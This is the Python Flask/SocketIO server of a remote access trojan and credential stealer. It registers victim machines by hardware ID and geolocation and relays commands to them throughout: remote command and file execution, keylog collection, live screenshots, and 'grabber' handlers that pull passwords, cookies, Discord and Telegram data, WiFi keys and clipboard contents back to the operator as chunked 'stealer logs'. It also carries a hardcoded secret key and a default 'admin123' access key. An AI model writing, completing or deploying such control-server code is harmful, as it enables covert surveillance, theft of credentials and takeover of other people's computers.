from flask import Flask, render_template, request, session, redirect, url_for, jsonify
from flask_socketio import SocketIO, emit
from functools import wraps
import hashlib
import json
import os
from blockchain import get_blockchain

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_key_change_me'
socketio = SocketIO(
    app, 
    cors_allowed_origins="*", 
    max_http_buffer_size=100*1024*1024,
    ping_timeout=120,
    ping_interval=25,
    async_mode='threading',
    engineio_logger=False,
    logger=False
)

clients = {}
CONFIG_FILE = 'config.json'
KEYS_FILE = 'keys.json'

# Initialize blockchain
blockchain = get_blockchain()

def load_config():
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            config = json.load(f)
            print(f"[CONFIG] Loaded configuration successfully")
            return config
    except Exception as e:
        print(f"[ERROR] Failed to load config: {e}")
        default_config = {
            "server": {"host": "0.0.0.0", "port": 5000},
            "client": {"server_url": "http://localhost:5000", "screenshot_interval": 2}
        }
        return default_config

def load_keys():
    try:
        with open(KEYS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception as e:
        print(f"[ERROR] Failed to load keys: {e}")
        default_keys = {
            "users": {
                "admin123": {
                    "admin": True,
                    "username": "Admin",
                    "ui_settings": {
                        "theme": "#c084fc",
                        "background": {"type": "gradient", "url": "", "video_opacity": 30, "video_blur": 0},
                        "interface": {"glass_effect": True, "animations": True, "panel_opacity": 100}
                    }
                }
            }
        }
        with open(KEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(default_keys, f, indent=2, ensure_ascii=False)
        return default_keys

def save_keys(keys_data):
    try:
        with open(KEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(keys_data, f, indent=2, ensure_ascii=False)
        return True
    except Exception as e:
        print(f"[ERROR] Failed to save keys: {e}")
        return False

def check_access_key(key):
    # Check blockchain first
    user = blockchain.get_user_by_key(key)
    if user:
        return True
    
    # Fallback to keys.json for compatibility
    keys_data = load_keys()
    return key in keys_data.get('users', {})

def is_admin(key):
    # Check blockchain first
    user = blockchain.get_user_by_key(key)
    if user:
        return user.get('admin', False)
    
    # Fallback to keys.json
    keys_data = load_keys()
    user = keys_data.get('users', {}).get(key, {})
    return user.get('admin', False)

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('auth'): return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

@app.route('/login', methods=['GET', 'POST'])
def login():
    if session.get('auth'):
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        key = request.form.get('key', '')
        remember = request.form.get('remember', False)
        
        if check_access_key(key):
            session['auth'] = True
            session['access_key'] = key
            
            if remember:
                session.permanent = True
                app.permanent_session_lifetime = __import__('datetime').timedelta(days=30)
                print(f"[AUTH] Successful login with key: {key[:4]}*** (Remember: 30 days)")
            else:
                session.permanent = False
                print(f"[AUTH] Successful login with key: {key[:4]}*** (Session only)")
            
            return redirect(url_for('index'))
        else:
            print(f"[AUTH] Failed login attempt with key: {key[:4]}***")
            return render_template('login.html', error=True)
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    key = session.get('access_key', 'unknown')
    session.clear()
    print(f"[AUTH] Logout: {key[:4] if key != 'unknown' else 'unknown'}***")
    return redirect(url_for('login'))

@app.route('/')
@require_auth
def index(): 
    return render_template('index.html')

@app.route('/api/settings', methods=['GET'])
@require_auth
def get_settings():
    try:
        user_key = session.get('access_key')
        
        # Try blockchain first
        user = blockchain.get_user_by_key(user_key)
        if user:
            return jsonify({
                'ui_settings': user.get('ui_settings', {}),
                'username': user.get('username', 'User'),
                'is_admin': user.get('admin', False),
                'hwid': user.get('hwid', 'N/A'),
                'source': 'blockchain'
            })
        
        # Fallback to keys.json
        keys_data = load_keys()
        user_data = keys_data.get('users', {}).get(user_key, {})
        
        return jsonify({
            'ui_settings': user_data.get('ui_settings', {}),
            'username': user_data.get('username', 'User'),
            'is_admin': user_data.get('admin', False),
            'source': 'legacy'
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@socketio.on('ping')
def handle_ping():
    emit('pong')

@app.route('/api/settings', methods=['POST'])
@require_auth
def save_settings():
    try:
        user_key = session.get('access_key')
        ui_settings = request.json
        
        # Save to blockchain
        try:
            blockchain.update_user_settings(user_key, ui_settings)
            print(f"[BLOCKCHAIN] Settings updated for user: {user_key[:4]}***")
        except Exception as e:
            print(f"[BLOCKCHAIN] Error: {e}")
        
        # Also save to keys.json for compatibility
        keys_data = load_keys()
        if user_key in keys_data.get('users', {}):
            keys_data['users'][user_key]['ui_settings'] = ui_settings
            save_keys(keys_data)
        
        return jsonify({'success': True, 'message': 'Settings saved to blockchain'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/keys', methods=['GET'])
@require_auth
def get_keys():
    try:
        user_key = session.get('access_key')
        if not is_admin(user_key):
            return jsonify({'error': 'Access denied. Admin only.'}), 403
        
        keys_data = load_keys()
        users = keys_data.get('users', {})
        
        user_list = []
        for key, data in users.items():
            user_list.append({
                'key': key[:4] + '*' * (len(key) - 4),
                'full_key': key,
                'username': data.get('username', 'User'),
                'admin': data.get('admin', False)
            })
        
        return jsonify({'keys': user_list})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/keys', methods=['POST'])
@require_auth
def add_key():
    try:
        user_key = session.get('access_key')
        if not is_admin(user_key):
            return jsonify({'success': False, 'error': 'Access denied. Admin only.'}), 403
        
        new_key = request.json.get('key', '').strip()
        username = request.json.get('username', 'User').strip()
        is_admin_user = request.json.get('admin', False)
        
        if not new_key or len(new_key) < 6:
            return jsonify({'success': False, 'error': 'Key must be at least 6 characters'}), 400
        
        # Check if user exists
        if blockchain.get_user_by_key(new_key):
            return jsonify({'success': False, 'error': 'Key already exists'}), 400
        
        # Add to blockchain
        ui_settings = {
            'theme': '#c084fc',
            'background': {
                'type': 'gradient',
                'url': '',
                'video_opacity': 30,
                'video_blur': 0
            },
            'interface': {
                'glass_effect': True,
                'animations': True,
                'panel_opacity': 100
            }
        }
        
        blockchain.add_user(username, new_key, is_admin_user, ui_settings)
        
        # Also add to keys.json for compatibility
        keys_data = load_keys()
        keys_data['users'][new_key] = {
            'admin': is_admin_user,
            'username': username,
            'ui_settings': ui_settings
        }
        save_keys(keys_data)
        
        print(f"[BLOCKCHAIN] New user added: {username} ({new_key[:4]}***) - Admin: {is_admin_user}")
        return jsonify({'success': True, 'message': 'User added to blockchain'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/keys/<key>', methods=['DELETE'])
@require_auth
def delete_key(key):
    try:
        user_key = session.get('access_key')
        if not is_admin(user_key):
            return jsonify({'success': False, 'error': 'Access denied. Admin only.'}), 403
        
        # Check blockchain
        user = blockchain.get_user_by_key(key)
        if not user:
            keys_data = load_keys()
            users = keys_data.get('users', {})
            if key not in users:
                return jsonify({'success': False, 'error': 'User not found'}), 404
        
        if key == user_key:
            return jsonify({'success': False, 'error': 'Cannot delete your own account'}), 400
        
        # Delete from blockchain
        try:
            blockchain.delete_user(key)
            print(f"[BLOCKCHAIN] User deleted: {key[:4]}***")
        except Exception as e:
            print(f"[BLOCKCHAIN] Delete error: {e}")
        
        # Delete from keys.json
        keys_data = load_keys()
        if key in keys_data.get('users', {}):
            username = keys_data['users'][key].get('username', 'User')
            del keys_data['users'][key]
            save_keys(keys_data)
            print(f"[AUTH] User deleted: {username} ({key[:4]}***)")
        
        return jsonify({'success': True, 'message': 'User deleted from blockchain'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500 

@socketio.on('connect')
def connect():
    print(f"[SOCKET] New connection from admin panel")
    print(f"[SOCKET] Broadcasting client_list with {len(clients)} clients")
    emit('client_list', clients, broadcast=True)

@socketio.on('register_client')
def register(data):
    cid = data['client_id']
    hwid = data.get('hwid', 'unknown')
    info = data.get('info', {})
    
    clients[cid] = {
        'sid': request.sid,
        'info': info,
        'hwid': hwid,
        'connected_at': __import__('time').time(),
        'keylogs': []
    }
    
    print(f"[+] Client registered: {cid} (HWID: {hwid})")
    print(f"[INFO] Geo: {info.get('geo', {})}")
    print(f"[INFO] System: OS={info.get('os')}, User={info.get('user')}, Host={info.get('hostname')}")
    print(f"[DEBUG] Full client data: {clients[cid]}")
    print(f"[DEBUG] Broadcasting client_list with {len(clients)} clients")
    
    # Broadcast updated client list
    emit('client_list', clients, broadcast=True)
    
    # Send info update to all connected admins
    emit('client_info_update', {
        'client_id': cid,
        'info': info
    }, broadcast=True)
    
    print(f"[DEBUG] Broadcast complete")

@socketio.on('request_client_info')
def request_client_info(data):
    """Request fresh info from a specific client"""
    cid = data.get('client_id')
    if cid and cid in clients:
        print(f"[INFO] Requesting fresh info from client: {cid}")
        # Ask the client to send updated info
        socketio.emit('refresh_info', {}, room=clients[cid]['sid'])
    else:
        print(f"[INFO] Client not found: {cid}")

@socketio.on('disconnect')
def disconnect():
    to_del = [k for k,v in clients.items() if v['sid'] == request.sid]
    for k in to_del: 
        del clients[k]
        print(f"[-] Client disconnected: {k}")
    emit('client_list', clients, broadcast=True)

@socketio.on('execute_command')
def cmd(d):
    if d['target_client'] in clients:
        socketio.emit('execute_command', d, room=clients[d['target_client']]['sid'])

@socketio.on('result_data')
def res(d): 
    emit('result_data', d, broadcast=True)

@socketio.on('command_result')
def cmd_result(d):
    emit('command_result', d, broadcast=True)

@socketio.on('keylog_update')
def keylog(d):
    cid = d['client_id']
    if cid in clients:
        # Заменяем весь лог вместо добавления
        clients[cid]['keylogs'] = [d['data']]
        emit('keylog_update', {'client_id': cid, 'data': d['data']}, broadcast=True)

@socketio.on('clear_keylog')
def clear_keylog(d):
    cid = d['target_client']
    if cid in clients:
        clients[cid]['keylogs'] = []
        # Очищаем буфер на клиенте
        socketio.emit('clear_keylog_client', {}, room=clients[cid]['sid'])
        emit('keylog_update', {'client_id': cid, 'data': ''}, broadcast=True)
        print(f"[KEYLOG] Buffer cleared for client: {cid}")

@socketio.on('download_keylog')
def download_keylog(d):
    cid = d['target_client']
    if cid in clients:
        full_log = "".join(clients[cid]['keylogs'])
        
        # Создаем текстовый файл с логами
        import datetime
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"keylog_{cid}_{timestamp}.txt"
        
        # Добавляем заголовок к файлу
        header = f"Keylogger Data Export\n"
        header += f"Client ID: {cid}\n"
        header += f"Export Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        header += f"Total Characters: {len(full_log)}\n"
        header += "=" * 50 + "\n\n"
        
        file_content = header + full_log
        
        # Кодируем в base64
        import base64
        b64_data = base64.b64encode(file_content.encode('utf-8')).decode()
        
        emit('keylog_download_ready', {
            'client_id': cid,
            'filename': filename,
            'data': b64_data
        }, broadcast=True)

@socketio.on('fs_list_request')
def fs_l(d): 
    if d['target_client'] in clients: 
        path = d.get('path', '.')
        print(f"[FILES] List request for path: {path}")
        socketio.emit('fs_list_request', d, room=clients[d['target_client']]['sid'])

@socketio.on('fs_view_data')
def fs_d(d): 
    path = d.get('path', '.')
    items_count = len(d.get('items', []))
    print(f"[FILES] Received {items_count} items for path: {path}")
    emit('fs_view_data', d, broadcast=True)

@socketio.on('fs_download_request')
def fs_dl(d): 
    if d['target_client'] in clients:
        print(f"[FILES] Download request: {d.get('filename', 'unknown')}")
        socketio.emit('fs_download_request', d, room=clients[d['target_client']]['sid'])

@socketio.on('fs_download_ready')
def fs_c(d): 
    print(f"[FILES] Download ready: {d.get('filename', 'unknown')}")
    emit('fs_download_ready', d, broadcast=True)

@socketio.on('fs_upload_file')
def fs_u(d): 
    if d['target_client'] in clients:
        print(f"[FILES] Upload request: {d.get('filename', 'unknown')}")
        socketio.emit('fs_upload_file', d, room=clients[d['target_client']]['sid'])

@socketio.on('fs_delete_request')
def fs_del(d):
    if d['target_client'] in clients:
        print(f"[FILES] Delete request: {d.get('filename', 'unknown')}")
        socketio.emit('fs_delete_request', d, room=clients[d['target_client']]['sid'])

@socketio.on('fs_execute_request')
def fs_exec(d):
    if d['target_client'] in clients:
        print(f"[FILES] Execute request: {d.get('filename', 'unknown')}")
        socketio.emit('fs_execute_request', d, room=clients[d['target_client']]['sid'])

@socketio.on('fs_operation_result')
def fs_result(d):
    print(f"[FILES] Operation result: {d.get('message', 'unknown')}")
    emit('fs_operation_result', d, broadcast=True)

@socketio.on('screenshot_data')
def sc(d):
    # Debug: log first few screenshots
    if not hasattr(sc, 'count'):
        sc.count = 0
    sc.count += 1
    
    if sc.count <= 3 or sc.count % 100 == 0:
        client_id = d.get('client_id', 'unknown')
        has_data = 'data' in d
        has_image = 'image' in d
        data_len = len(d.get('data', '')) if has_data else 0
        image_len = len(d.get('image', '')) if has_image else 0
        print(f"[SCREENSHOT] #{sc.count} from {client_id}: data={has_data}({data_len}), image={has_image}({image_len})")
    
    emit('screenshot_data', d, broadcast=True)

@socketio.on('update_screen_settings')
def update_screen_settings(d):
    if d['target_client'] in clients:
        settings = {
            'quality': d.get('quality', 40),
            'fps': d.get('fps', 3),
            'resolution': d.get('resolution', '800x600')
        }
        print(f"[SCREEN] Settings: Q={settings['quality']}% FPS={settings['fps']} Res={settings['resolution']}")
        socketio.emit('update_screen_settings', settings, room=clients[d['target_client']]['sid'])

# === NEW GRABBER HANDLERS ===
@socketio.on('grab_passwords')
def grab_passwords(d):
    if d['target_client'] in clients:
        print(f"[GRABBER] Password grab request for client: {d['target_client']}")
        socketio.emit('grab_passwords', {}, room=clients[d['target_client']]['sid'])

@socketio.on('grab_discord')
def grab_discord(d):
    if d['target_client'] in clients:
        print(f"[GRABBER] Discord grab request for client: {d['target_client']}")
        socketio.emit('grab_discord', {}, room=clients[d['target_client']]['sid'])

@socketio.on('grab_telegram')
def grab_telegram(d):
    if d['target_client'] in clients:
        print(f"[GRABBER] Telegram grab request for client: {d['target_client']}")
        socketio.emit('grab_telegram', {}, room=clients[d['target_client']]['sid'])

@socketio.on('grab_wifi')
def grab_wifi(d):
    if d['target_client'] in clients:
        print(f"[GRABBER] WiFi grab request for client: {d['target_client']}")
        socketio.emit('grab_wifi', {}, room=clients[d['target_client']]['sid'])

@socketio.on('grab_history')
def grab_history(d):
    if d['target_client'] in clients:
        print(f"[GRABBER] History grab request for client: {d['target_client']}")
        socketio.emit('grab_history', {}, room=clients[d['target_client']]['sid'])

@socketio.on('grab_cookies')
def grab_cookies(d):
    if d['target_client'] in clients:
        print(f"[GRABBER] Cookies grab request for client: {d['target_client']}")
        socketio.emit('grab_cookies', {}, room=clients[d['target_client']]['sid'])

@socketio.on('grab_clipboard')
def grab_clipboard(d):
    if d['target_client'] in clients:
        print(f"[GRABBER] Clipboard grab request for client: {d['target_client']}")
        socketio.emit('grab_clipboard', {}, room=clients[d['target_client']]['sid'])

@socketio.on('grab_system_info')
def grab_system_info(d):
    if d['target_client'] in clients:
        print(f"[GRABBER] System info grab request for client: {d['target_client']}")
        socketio.emit('grab_system_info', {}, room=clients[d['target_client']]['sid'])

@socketio.on('grab_all')
def grab_all(d):
    if d['target_client'] in clients:
        print(f"[GRABBER] Comprehensive grab request for client: {d['target_client']}")
        socketio.emit('grab_all', {}, room=clients[d['target_client']]['sid'])

# === ADDITIONAL SYSTEM COMMANDS ===
@socketio.on('system_shutdown')
def system_shutdown(d):
    if d['target_client'] in clients:
        print(f"[SYSTEM] Shutdown request for client: {d['target_client']}")
        socketio.emit('system_shutdown', d, room=clients[d['target_client']]['sid'])

@socketio.on('system_restart')
def system_restart(d):
    if d['target_client'] in clients:
        print(f"[SYSTEM] Restart request for client: {d['target_client']}")
        socketio.emit('system_restart', d, room=clients[d['target_client']]['sid'])

@socketio.on('cancel_shutdown')
def cancel_shutdown(d):
    if d['target_client'] in clients:
        print(f"[SYSTEM] Cancel shutdown request for client: {d['target_client']}")
        socketio.emit('cancel_shutdown', {}, room=clients[d['target_client']]['sid'])

@socketio.on('lock_screen')
def lock_screen(d):
    if d['target_client'] in clients:
        print(f"[SYSTEM] Lock screen request for client: {d['target_client']}")
        socketio.emit('lock_screen', {}, room=clients[d['target_client']]['sid'])

@socketio.on('get_processes')
def get_processes(d):
    if d['target_client'] in clients:
        print(f"[SYSTEM] Process list request for client: {d['target_client']}")
        socketio.emit('get_processes', {}, room=clients[d['target_client']]['sid'])

@socketio.on('kill_process')
def kill_process(d):
    if d['target_client'] in clients:
        print(f"[SYSTEM] Kill process request for client: {d['target_client']}")
        socketio.emit('kill_process', d, room=clients[d['target_client']]['sid'])

@socketio.on('block_input')
def block_input(d):
    if d['target_client'] in clients:
        print(f"[SYSTEM] Block input request for client: {d['target_client']}")
        socketio.emit('block_input', d, room=clients[d['target_client']]['sid'])

@socketio.on('show_message')
def show_message(d):
    if d['target_client'] in clients:
        print(f"[SYSTEM] Show message request for client: {d['target_client']}")
        socketio.emit('show_message', d, room=clients[d['target_client']]['sid'])

@socketio.on('open_website')
def open_website(d):
    if d['target_client'] in clients:
        print(f"[SYSTEM] Open website request for client: {d['target_client']}")
        socketio.emit('open_website', d, room=clients[d['target_client']]['sid'])

@socketio.on('get_clipboard')
def get_clipboard(d):
    if d['target_client'] in clients:
        print(f"[SYSTEM] Get clipboard request for client: {d['target_client']}")
        socketio.emit('get_clipboard', {}, room=clients[d['target_client']]['sid'])

@socketio.on('set_clipboard')
def set_clipboard(d):
    if d['target_client'] in clients:
        print(f"[SYSTEM] Set clipboard request for client: {d['target_client']}")
        socketio.emit('set_clipboard', d, room=clients[d['target_client']]['sid'])

@socketio.on('get_installed_programs')
def get_installed_programs(d):
    if d['target_client'] in clients:
        print(f"[SYSTEM] Get installed programs request for client: {d['target_client']}")
        socketio.emit('get_installed_programs', {}, room=clients[d['target_client']]['sid'])

@socketio.on('change_wallpaper')
def change_wallpaper(d):
    if d['target_client'] in clients:
        print(f"[SYSTEM] Change wallpaper request for client: {d['target_client']}, URL: {d.get('url', 'N/A')}")
        socketio.emit('change_wallpaper', d, room=clients[d['target_client']]['sid'])

@socketio.on('upload_wallpaper')
def upload_wallpaper(d):
    if d['target_client'] in clients:
        print(f"[SYSTEM] Upload wallpaper request for client: {d['target_client']}")
        socketio.emit('upload_wallpaper', d, room=clients[d['target_client']]['sid'])

# === STEALER LOG DOWNLOAD ===
@socketio.on('download_stealer_logs')
def download_stealer_logs(d):
    if d['target_client'] in clients:
        print(f"[STEALER] Download logs request for client: {d['target_client']}")
        socketio.emit('download_stealer_logs', {}, room=clients[d['target_client']]['sid'])

@socketio.on('stealer_download_ready')
def stealer_download_ready(d):
    print(f"[STEALER] Download ready: {d.get('filename', 'unknown')}")
    emit('stealer_download_ready', d, broadcast=True)

# === CHUNKED TRANSFER HANDLERS ===
@socketio.on('stealer_download_ready_start')
def stealer_download_ready_start(d):
    print(f"[STEALER] Chunked transfer start: {d.get('filename', 'unknown')}, {d.get('total_chunks', 0)} chunks")
    emit('stealer_download_ready_start', d, broadcast=True)

@socketio.on('stealer_download_ready_chunk')
def stealer_download_ready_chunk(d):
    chunk_idx = d.get('chunk_index', 0)
    total = d.get('total_chunks', 0)
    print(f"[STEALER] Chunk {chunk_idx + 1}/{total}")
    emit('stealer_download_ready_chunk', d, broadcast=True)

@socketio.on('stealer_download_ready_end')
def stealer_download_ready_end(d):
    print(f"[STEALER] Chunked transfer complete: {d.get('filename', 'unknown')}")
    emit('stealer_download_ready_end', d, broadcast=True)

@socketio.on('stealer_data')
def stealer_data(d):
    emit('stealer_data', d, broadcast=True)

if __name__ == '__main__':
    config = load_config()
    host = config.get('server', {}).get('host', '0.0.0.0')
    port = config.get('server', {}).get('port', 5000)
    debug = config.get('server', {}).get('debug', True)
    
    print(f"[*] Server started on http://{host}:{port}")
    print(f"[*] Debug mode: {debug}")
    socketio.run(app, host=host, port=port, debug=debug)